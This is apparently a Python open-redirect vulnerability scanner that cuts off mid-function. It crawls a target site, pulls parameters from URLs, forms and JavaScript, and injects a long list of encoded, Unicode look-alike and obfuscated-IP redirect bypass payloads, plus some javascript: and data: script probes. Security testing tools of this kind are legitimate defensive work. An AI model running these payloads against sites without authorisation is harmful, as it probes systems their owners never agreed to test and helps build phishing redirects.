#!/usr/bin/env python3
"""
Professional Open Redirect Vulnerability Scanner
Author: Security Research Team
Version: 1.0

A comprehensive tool for discovering and exploiting open redirect vulnerabilities
with deep crawling, JavaScript analysis, and context-aware payload injection.
"""

import asyncio
import aiohttp
import re
import json
import time
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs, unquote
from dataclasses import dataclass, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from pathlib import Path
import logging
import argparse
from datetime import datetime
import hashlib
import base64
import random
import string

# Selenium for screenshot capture
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

# BeautifulSoup for HTML parsing
from bs4 import BeautifulSoup

# JavaScript analysis
import esprima
import jsbeautifier

# Report generation
from jinja2 import Template
import html


@dataclass
class Parameter:
    """Represents a discovered parameter"""
    name: str
    value: str
    source: str  # 'url', 'form', 'javascript', 'headers'
    context: str  # 'query', 'path', 'fragment', 'form_action', 'js_variable'
    url: str
    method: str = 'GET'
    is_redirect_related: bool = False


@dataclass
class Vulnerability:
    """Represents a discovered open redirect vulnerability"""
    url: str
    parameter: str
    payload: str
    method: str
    response_code: int
    redirect_url: str
    context: str
    screenshot_path: Optional[str] = None
    timestamp: str = ""
    vulnerability_type: str = "open_redirect"  # or "dom_based_redirect"


class OpenRedirectScanner:
    """Professional Open Redirect Vulnerability Scanner"""
    
    def __init__(self, target_url: str, max_depth: int = 3, max_pages: int = 100):
        self.target_url = target_url.rstrip('/')
        self.base_domain = urlparse(target_url).netloc
        self.max_depth = max_depth
        self.max_pages = max_pages
        
        # Storage
        self.discovered_urls: Set[str] = set()
        self.parameters: List[Parameter] = []
        self.vulnerabilities: List[Vulnerability] = []
        self.js_files: Set[str] = set()
        
        # Session management
        self.session: Optional[aiohttp.ClientSession] = None
        self.driver: Optional[webdriver.Chrome] = None
        
        # Configuration
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]
        
        # Setup logging
        self.setup_logging()
        
        # Load payloads
        self.payloads = self.load_payloads()
        
        # Redirect-related parameter patterns
        self.redirect_patterns = [
            r'redirect', r'url', r'next', r'return', r'goto', r'target',
            r'destination', r'continue', r'forward', r'redir', r'location',
            r'site', r'link', r'href', r'returnurl', r'returnto', r'back',
            r'callback', r'success', r'failure', r'done', r'exit'
        ]
    
    def setup_logging(self):
        """Setup logging configuration"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('open_redirect_scanner.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def load_payloads(self) -> List[str]:
        """Load open redirect payloads"""
        payloads = [
            "/%09/google.com",
            "/%2f%2fgoogle.com",
            "/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/",
            "/%5cgoogle.com",
            "/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "/.google.com",
            "//%09/google.com",
            "//%5cgoogle.com",
            "///%09/google.com",
            "///%5cgoogle.com",
            "////%09/google.com",
            "////%5cgoogle.com",
            "/////google.com",
            "/////google.com/",
            "////google.com/",
            "////google.com/%2e%2e",
            "////google.com/%2e%2e%2f",
            "////google.com/%2f%2e%2e",
            "////google.com/%2f..",
            "////google.com//",
            "///google.com",
            "///google.com/",
            "//google.com/%2f..",
            "///google.com/%2f..",
            "https://google.com/%2f..",
            "//www.google.com/%2f%2e%2e",
            "///www.google.com/%2f%2e%2e",
            "////www.google.com/%2f%2e%2e",
            "https://www.google.com/%2f%2e%2e",
            "//google.com/",
            "https://google.com/",
            "//google.com//",
            "///google.com//",
            "https://google.com//",
            "//www.google.com/%2e%2e%2f",
            "///www.google.com/%2e%2e%2f",
            "////www.google.com/%2e%2e%2f",
            "https://www.google.com/%2e%2e%2f",
            "///www.google.com/%2e%2e",
            "////www.google.com/%2e%2e",
            "https:///www.google.com/%2e%2e",
            "/https://www.google.com/%2e%2e",
            "https:///www.google.com/%2f%2e%2e",
            "https://%09/google.com",
            "https:google.com",
            "//google%E3%80%82com",
            "\/\/google.com/",
            "/\/google.com/",
            "http://0xd8.0x3a.0xd6.0xce",
            "〱google.com",
            "〵google.com",
            "ゝgoogle.com",
            "ーgoogle.com",
            "ｰgoogle.com",
            "/〱google.com",
            "/〵google.com",
            "/ゝgoogle.com",
            "/ーgoogle.com",
            "/ｰgoogle.com",
            "%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "http://%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "///google.com/%2e%2e",
            "///google.com/%2e%2e%2f",
            "///google.com/%2f%2e%2e",
            "//google.com",
            "//google.com/%2e%2e",
            "//google.com/%2e%2e%2f",
            "//google.com/%2f%2e%2e",
            "//https:///google.com/%2e%2e",
            "//https://google.com/%2e%2e%2f",
            "/&lt;&gt;//google.com",
            "/?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com",
            "/?url=/\/google.com&next=/\/google.com&redirect=/\/google.com&redirect_uri=/\/google.com",
            "/?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://google.com&rurl=Https://google.com&redirect_uri=Https://google.com&lt;br/&gt;/\/\/google.com/",
            "/google.com/%2f%2e%2e",
            "/http://google.com",
            "/http:/google.com",
            "/https:/%5cgoogle.com/",
            "/https://%5cgoogle.com",
            "/https://google.com/%2e%2e",
            "/https://google.com/%2f%2e%2e",
            "/https:google.com",
            "/redirect?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com",
            "/redirect?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://example.com&rurl=Https://google.com&redirect_uri=Https://google.com",
            "//%2fxgoogle.com",
            "//localdomain%E3%80%82pw",
            "http://0xd83ad6ce",
            "http://3627734734",
            "http://472.314.470.462",
            "http://0330.072.0326.0316",
            "http://00330.00072.0000326.00000316",
            "http://0xd8.072.54990",
            "http://0xd8.3856078",
            "http://00330.3856078",
            "http://00330.0x3a.54990",
            "http:0xd8.0x3a.0xd6.0xce",
            "http:0xd83ad6ce",
            "http:3627734734",
            "http:472.314.470.462",
            "http:0330.072.0326.0316",
            "http:00330.00072.0000326.00000316",
            "http:[::216.58.214.206]",
            "http:[::ffff:216.58.214.206]",
            "http:0xd8.072.54990",
            "http:0xd8.3856078",
            "http:00330.3856078",
            "http:00330.0x3a.54990",
            "&lt;&gt;//google.com",
            "http://.google.com",
            "https://google.com/https://google.com/",
            "http://google.com\tgoogle.com/",
            "//google.com\tgoogle.com/",
            "http://google.com%2f%2f.google.com/",
            "http://google.com%5c%5c.google.com/",
            "http://google.com%3F.google.com/",
            "http://google.com%23.google.com/",
            "http://google.com:80%40google.com/",
            "http://google.com%2egoogle.com/",
            "/〱ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "〱ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "$2f%2f216.58.214.206%2f%2f",
            "$2f%2f3627734734%2f%2f",
            "$2f%2fgoogle.com",
            "$2f%2fgoogle.com%2f%2f",
            "%01https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "/%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "//%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "///%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "////%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "////216.58.214.206",
            "///216.58.214.206",
            "//216.58.214.206",
            "/\216.58.214.206",
            "/216.58.214.206",
            "216.58.214.206",
            "%2f$2f216.58.214.206",
            "%2f$2f3627734734",
            "%2f$2fgoogle.com",
            "%2f216.58.214.206",
            "%2f216.58.214.206//",
            "%2f216.58.214.206%2f%2f",
            "//%2f%2fgoogle.com",
            "/%2f%2fⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "//%2f%2fⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "%2f3627734734",
            "%2f3627734734//",
            "%2f3627734734%2f%2f",
            "/%2f%5c%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77/",
            "%2fgoogle.com",
            "%2fgoogle.com//",
            "\\google.com",
            "%2fgoogle.com%2f%2f",
            "////3627734734",
            "///3627734734",
            "//3627734734",
            "/\3627734734",
            "/3627734734",
            "//%2F/google.com",
            "/%0D/google.com",
            "/%2F/google.com",
            "/%5Cgoogle.com",
            "/%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "//%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "///%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "////%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "/\google%252ecom",
            "google%252ecom",
            "../google.com",
            "//google%00.com",
            "////google.com",
            "//\/google.com/",
            "//\google.com",
            "/<>//google.com",
            "/\/\/google.com/",
            "/\/google.com",
            "/\google.com",
            "/google.com",
            "//google.com/%2E%2E",
            "//google.com/%2F..",
            "/google.com/%2F..",
            "//google.com//%2F%2E%2E",
            "google.com/.jpg",
            "http:%0a%0dgoogle.com",
            "http:%0a%0dⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "http:/\/\google.com",
            "http:/google.com",
            "http:google.com",
            "/http:/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "http://.ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "http:/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "http:ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "https://%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "https://%0a%0dgoogle.com",
            "https://%0a%0dⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "https%3a%2f%2fgoogle.com%2f",
            "https:/%5cgoogle.com/",
            "/https:/%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "/https://%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "https:/%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "https://%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77",
            "https:/\google.com",
            "https://google%E3%80%82com",
            "//https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "https:ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "//https:///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
            "//https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
            "/https:///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
            "javascript:confirm(1)",
            "javascript:prompt(1)",
            "//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ%00｡Ｐⓦ",
            "//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ%E3%80%82pw",
            "/.ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "/////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "/////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
            "//\/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
            "/\/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "<>//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "\/\/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e"
        ]
        return payloads
    
    async def init_session(self):
        """Initialize HTTP session"""
        timeout = aiohttp.ClientTimeout(total=30)
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=20)
        
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers={
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache'
            }
        )
    
    def init_driver(self):
        """Initialize Chrome WebDriver for screenshots"""
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--window-size=1920,1080')
        chrome_options.add_argument('--disable-web-security')
        chrome_options.add_argument('--allow-running-insecure-content')
        chrome_options.add_argument('--ignore-certificate-errors')
        
        try:
            self.driver = webdriver.Chrome(options=chrome_options)
            self.logger.info("Chrome WebDriver initialized successfully")
        except Exception as e:
            self.logger.error(f"Failed to initialize Chrome WebDriver: {e}")
            self.driver = None
    
    async def crawl_website(self) -> Set[str]:
        """Perform deep crawling of the target website"""
        self.logger.info(f"Starting deep crawl of {self.target_url}")
        
        urls_to_crawl = {self.target_url}
        crawled_urls = set()
        depth = 0
        
        while urls_to_crawl and depth < self.max_depth and len(crawled_urls) < self.max_pages:
            current_level_urls = urls_to_crawl.copy()
            urls_to_crawl.clear()
            
            tasks = []
            for url in current_level_urls:
                if url not in crawled_urls:
                    tasks.append(self.crawl_single_page(url))
            
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, Exception):
                        self.logger.error(f"Crawling error: {result}")
                        continue
                    
                    if result:
                        url, new_urls, params = result
                        crawled_urls.add(url)
                        self.parameters.extend(params)
                        
                        # Add new URLs for next depth level
                        for new_url in new_urls:
                            if self.is_same_domain(new_url) and new_url not in crawled_urls:
                                urls_to_crawl.add(new_url)
            
            depth += 1
            self.logger.info(f"Completed depth {depth}, found {len(crawled_urls)} URLs")
        
        self.discovered_urls = crawled_urls
        self.logger.info(f"Crawling completed. Total URLs: {len(crawled_urls)}, Parameters: {len(self.parameters)}")
        return crawled_urls
    
    async def crawl_single_page(self, url: str) -> Optional[Tuple[str, Set[str], List[Parameter]]]:
        """Crawl a single page and extract parameters and links"""
        try:
            async with self.session.get(url, allow_redirects=False) as response:
                content = await response.text()
                
                # Parse HTML
                soup = BeautifulSoup(content, 'html.parser')
                
                # Extract URLs from links
                new_urls = set()
                for link in soup.find_all(['a', 'link'], href=True):
                    href = link['href']
                    full_url = urljoin(url, href)
                    if self.is_same_domain(full_url):
                        new_urls.add(full_url)
                
                # Extract parameters from current URL
                params = self.extract_url_parameters(url)
                
                # Extract form parameters
                params.extend(self.extract_form_parameters(soup, url))
                
                # Extract JavaScript files and analyze them
                js_urls = self.extract_js_urls(soup, url)
                for js_url in js_urls:
                    self.js_files.add(js_url)
                    js_params = await self.analyze_javascript_file(js_url)
                    params.extend(js_params)
                
                # Extract parameters from inline JavaScript
                inline_js_params = self.extract_inline_js_parameters(soup, url)
                params.extend(inline_js_params)
                
                return url, new_urls, params
                
        except Exception as e:
            self.logger.error(f"Error crawling {url}: {e}")
            return None
    
    def is_same_domain(self, url: str) -> bool:
        """Check if URL belongs to the same domain"""
        try:
            parsed = urlparse(url)
            return parsed.netloc == self.base_domain or parsed.netloc.endswith(f'.{self.base_domain}')
        except:
            return False
    
    def extract_url_parameters(self, url: str) -> List[Parameter]:
        """Extract parameters from URL"""
        params = []
        parsed = urlparse(url)
        
        # Query parameters
        query_params = parse_qs(parsed.query)
        for param_name, param_values in query_params.items():
            for value in param_values:
                is_redirect = self.is_redirect_parameter(param_name)
                params.append(Parameter(
                    name=param_name,
                    value=value,
                    source='url',
                    context='query',
                    url=url,
                    is_redirect_related=is_redirect
                ))
        
        # Fragment parameters
        if parsed.fragment:
            fragment_params = parse_qs(parsed.fragment)
            for param_name, param_values in fragment_params.items():
                for value in param_values:
                    is_redirect = self.is_redirect_parameter(param_name)
                    params.append(Parameter(
                        name=param_name,
                        value=value,
                        source='url',
                        context='fragment',
                        url=url,
                        is_redirect_related=is_redirect
                    ))
        
        return params
    
    def extract_form_parameters(self, soup: BeautifulSoup, url: str) -> List[Parameter]:
        """Extract parameters from forms"""
        params = []
        
        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            form_url = urljoin(url, action) if action else url
            
            for input_tag in form.find_all(['input', 'select', 'textarea']):
                name = input_tag.get('name')
                value = input_tag.get('value', '')
                
                if name:
                    is_redirect = self.is_redirect_parameter(name)
                    params.append(Parameter(
                        name=name,
                        value=value,
                        source='form',
                        context='form_input',
                        url=form_url,
                        method=method,
                        is_redirect_related=is_redirect
                    ))
        
        return params
    
    def extract_js_urls(self, soup: BeautifulSoup, base_url: str) -> Set[str]:
        """Extract JavaScript file URLs"""
        js_urls = set()
        
        for script in soup.find_all('script', src=True):
            src = script['src']
            js_url = urljoin(base_url, src)
            if self.is_same_domain(js_url):
                js_urls.add(js_url)
        
        return js_urls
    
    async def analyze_javascript_file(self, js_url: str) -> List[Parameter]:
        """Analyze JavaScript file for parameters"""
        params = []
        
        try:
            async with self.session.get(js_url) as response:
                js_content = await response.text()
                
                # Beautify JavaScript for better analysis
                try:
                    js_content = jsbeautifier.beautify(js_content)
                except:
                    pass
                
                # Extract parameters using regex patterns
                param_patterns = [
                    r'["\'](\w+)["\']:\s*["\']([^"\']*)["\']',  # Object properties
                    r'\.(\w+)\s*=\s*["\']([^"\']*)["\']',      # Property assignments
                    r'(\w+)\s*=\s*["\']([^"\']*)["\']',        # Variable assignments
                    r'location\.href\s*=\s*["\']([^"\']*)["\']',  # Direct redirects
                    r'window\.location\s*=\s*["\']([^"\']*)["\']',
                    r'document\.location\s*=\s*["\']([^"\']*)["\']',
                    r'location\.assign\(["\']([^"\']*)["\']\)',
                    r'location\.replace\(["\']([^"\']*)["\']\)',
                    r'window\.open\(["\']([^"\']*)["\']\)',
                ]
                
                for pattern in param_patterns:
                    matches = re.findall(pattern, js_content, re.IGNORECASE)
                    for match in matches:
                        if isinstance(match, tuple):
                            if len(match) == 2:
                                param_name, param_value = match
                            else:
                                param_name = f"js_param_{len(params)}"
                                param_value = match[0]
                        else:
                            param_name = f"redirect_url_{len(params)}"
                            param_value = match
                        
                        is_redirect = self.is_redirect_parameter(param_name) or 'location' in pattern
                        params.append(Parameter(
                            name=param_name,
                            value=param_value,
                            source='javascript',
                            context='js_variable',
                            url=js_url,
                            is_redirect_related=is_redirect
                        ))
                
                # Parse JavaScript AST for more advanced analysis
                try:
                    ast = esprima.parseScript(js_content)
                    ast_params = self.extract_params_from_ast(ast, js_url)
                    params.extend(ast_params)
                except:
                    pass
                
        except Exception as e:
            self.logger.error(f"Error analyzing JavaScript file {js_url}: {e}")
        
        return params
    
    def extract_inline_js_parameters(self, soup: BeautifulSoup, url: str) -> List[Parameter]:
        """Extract parameters from inline JavaScript"""
        params = []
        
        for script in soup.find_all('script'):
            if script.string:
                js_content = script.string
                
                # Look for redirect-related patterns
                redirect_patterns = [
                    r'location\.href\s*=\s*["\']([^"\']*)["\']',
                    r'window\.location\s*=\s*["\']([^"\']*)["\']',
                    r'document\.location\s*=\s*["\']([^"\']*)["\']',
                    r'location\.assign\(["\']([^"\']*)["\']\)',
                    r'location\.replace\(["\']([^"\']*)["\']\)',
                    r'window\.open\(["\']([^"\']*)["\']\)',
                ]
                
                for pattern in redirect_patterns:
                    matches = re.findall(pattern, js_content, re.IGNORECASE)
                    for match in matches:
                        params.append(Parameter(
                            name=f"inline_redirect_{len(params)}",
                            value=match,
                            source='javascript',
                            context='inline_js',
                            url=url,
                            is_redirect_related=True
                        ))
        
        return params
    
    def extract_params_from_ast(self, ast: Any, js_url: str) -> List[Parameter]:
        """Extract parameters from JavaScript AST"""
        params = []
        
        def traverse_ast(node):
            if hasattr(node, 'type'):
                # Look for variable assignments
                if node.type == 'AssignmentExpression':
                    if hasattr(node, 'left') and hasattr(node, 'right'):
                        if hasattr(node.left, 'property') and hasattr(node.left.property, 'name'):
                            param_name = node.left.property.name
                            if hasattr(node.right, 'value'):
                                param_value = str(node.right.value)
                                is_redirect = self.is_redirect_parameter(param_name)
                                params.append(Parameter(
                                    name=param_name,
                                    value=param_value,
                                    source='javascript',
                                    context='js_assignment',
                                    url=js_url,
                                    is_redirect_related=is_redirect
                                ))
                
                # Recursively traverse child nodes
                for key, value in node.__dict__.items():
                    if isinstance(value, list):
                        for item in value:
                            traverse_ast(item)
                    elif hasattr(value, 'type'):
                        traverse_ast(value)
        
        try:
            traverse_ast(ast)
        except:
            pass
        
        return params
    
    def is_redirect_parameter(self, param_name: str) -> bool:
        """Check if parameter name suggests it's redirect-related"""
        param_lower = param_name.lower()
        return any(pattern in param_lower for pattern in self.redirect_patterns)
    
    def detect_context(self, param: Parameter) -> str:
        """Detect the context of parameter usage for payload selection"""
        contexts = {
            'url_scheme': ['http://', 'https://', 'ftp://'],
            'url_path': ['/', '\\', '%2f', '%5c'],
            'url_query': ['?', '&', '%3f', '%26'],
            'url_fragment': ['#', '%23'],
            'javascript': ['javascript:', 'data:', 'vbscript:'],
            'html_attribute': ['href=', 'src=', 'action='],
            'json': ['{', '}', '[', ']'],
            'xml': ['<', '>', '&lt;', '&gt;']
        }
        
        param_value = param.value.lower()
        param_context = param.context.lower()
        
        # Check parameter value for context clues
        for context_type, indicators in contexts.items():
            if any(indicator in param_value for indicator in indicators):
                return context_type
        
        # Check parameter context
        if 'js' in param_context or 'javascript' in param_context:
            return 'javascript'
        elif 'form' in param_context:
            return 'html_attribute'
        elif 'query' in param_context:
            return 'url_query'
        elif 'fragment' in param_context:
            return 'url_fragment'
        
        return 'generic'
    
    def get_context_aware_payloads(self, context: str) -> List[str]:
        """Get payloads suitable for the detected context"""
        context_payloads = {
            'url_scheme': [
                "//google.com",
                "https://google.com",
                "http://google.com",
                "//google.com/",
                "https://google.com/",
            ],
            'url_path': [
                "//google.com",
                "/%2f%2fgoogle.com",
                "/%5cgoogle.com",
                "/google.com",
                "\\google.com",
            ],
            'url_query': [
                "//google.com",
                "google.com",
                "https://google.com",
                "%2f%2fgoogle.com",
            ],
            'url_fragment': [
                "#//google.com",
                "#google.com",
                "#https://google.com",
            ],
            'javascript': [
                "javascript:confirm(1)",
                "javascript:prompt(1)",
                "data:text/html,<script>alert(1)</script>",
            ],
            'html_attribute': [
                "//google.com",
                "javascript:confirm(1)",
                "https://google.com",
            ],
            'generic': self.payloads[:20]  # Use first 20 payloads for generic context
        }
        
        return context_payloads.get(context, self.payloads[:10])
    
    async def test_open_redirect(self) -> List[Vulnerability]:
        """Test all parameters for open redirect vulnerabilities"""
        self.logger.info("Starting open redirect vulnerability testing")
        
        vulnerabilities = []
        redirect_params = [p for p in self.parameters if p.is_redirect_related]
        
        self.logger.info(f"Testing {len(redirect_params)} redirect-related parameters")
        
        # Test redirect-related parameters first
        for param in redirect_params:
            context = self.detect_context(param)
            payloads = self.get_context_aware_payloads(context)
            
            for payload in payloads:
                vuln = await self.test_parameter_with_payload(param, payload)
                if vuln:
                    vulnerabilities.append(vuln)
                    
                # Rate limiting
                await asyncio.sleep(0.1)
        
        # Test other parameters with limited payloads
        other_params = [p for p in self.parameters if not p.is_redirect_related]
        limited_payloads = self.payloads[:5]  # Test only first 5 payloads for non-redirect params
        
        for param in other_params[:50]:  # Limit to first 50 other parameters
            for payload in limited_payloads:
                vuln = await self.test_parameter_with_payload(param, payload)
                if vuln:
                    vulnerabilities.append(vuln)
                    
                await asyncio.sleep(0.1)
        
        self.vulnerabilities = vulnerabilities
        self.logger.info(f"Testing completed. Found {len(vulnerabilities)} vulnerabilities")
        return vulnerabilities
    
    async def test_parameter_with_payload(self, param: Parameter, payload: str) -> Optional[Vulnerability]:
        """Test a single parameter with a payload"""
        try:
            # Construct test URL
            test_url = self.construct_test_url(param, payload)
            
            # Make request
            async with self.session.get(test_url, allow_redirects=False) as response:
                # Check for redirect responses
                if response.status in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    
                    # Check if redirect goes to our payload domain
                    if self.is_successful_redirect(location, payload):
                        self.logger.info(f"Found open redirect: {test_url}")
                        
                        # Take screenshot as PoC
                        screenshot_path = await self.take_screenshot(test_url)
                        
                        return Vulnerability(
                            url=test_url,
                            parameter=param.name,
                            payload=payload,
                            method=param.method,
                            response_code=response.status,
                            redirect_url=location,
                            context=param.context,
                            screenshot_path=screenshot_path,
                            timestamp=datetime.now().isoformat(),
                            vulnerability_type="open_redirect"
                        )
                
                # Check for DOM-based redirects in response content
                content = await response.text()
                dom_vuln = self.check_dom_based_redirect(content, test_url, param, payload)
                if dom_vuln:
                    return dom_vuln
                    
        except Exception as e:
            self.logger.debug(f"Error testing {param.name} with payload {payload}: {e}")
        
        return None
    
    def construct_test_url(self, param: Parameter, payload: str) -> str:
        """Construct test URL with payload"""
        parsed = urlparse(param.url)
        
        if param.context == 'query':
            # Modify query parameter
            query_params = parse_qs(parsed.query)
            query_params[param.name] = [payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        
        elif param.context == 'fragment':
            # Modify fragment parameter
            return f"{param.url.split('#')[0]}#{param.name}={payload}"
        
        elif param.context == 'form_input':
            # For forms, we'll test by adding the parameter to the URL
            separator = '&' if '?' in param.url else '?'
            return f"{param.url}{separator}{param.name}={urllib.parse.quote(payload)}"
        
        else:
            # Generic parameter injection
            separator = '&' if '?' in param.url else '?'
            return f"{param.url}{separator}{param.name}={urllib.parse.quote(payload)}"
    
    def is_successful_redirect(self, location: str, payload: str) -> bool:
        """Check if redirect location matches our payload"""
        if not location:
            return False
        
        # Check for exact matches
        if 'google.com' in location.lower():
            return True
        
        # Check for encoded matches
        decoded_location = unquote(location)
        if 'google.com' in decoded_location.lower():
            return True
        
        # Check for IP address matches
        ip_patterns = ['216.58.214.206', '0xd8.0x3a.0xd6.0xce', '3627734734']
        for ip in ip_patterns:
            if ip in location or ip in decoded_location:
                return True
        
        return False
    
    def check_dom_based_redirect(self, content: str, test_url: str, param: Parameter, payload: str) -> Optional[Vulnerability]:
        """Check for DOM-based open redirect vulnerabilities"""
        # Look for JavaScript patterns that might cause DOM-based redirects
        dom_patterns = [
            r'location\.href\s*=\s*["\']?([^"\';\s]+)',
            r'window\.location\s*=\s*["\']?([^"\';\s]+)',
            r'document\.location\s*=\s*["\']?([^"\';\s]+)',
            r'location\.assign\(["\']?([^"\';\s)]+)',
            r'location\.replace\(["\']?([^"\';\s)]+)',
            r'window\.open\(["\']?([^"\';\s,)]+)',
        ]
        
        for pattern in dom_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if param.name in match or payload in match:
                    return Vulnerability(
                        url=test_url,
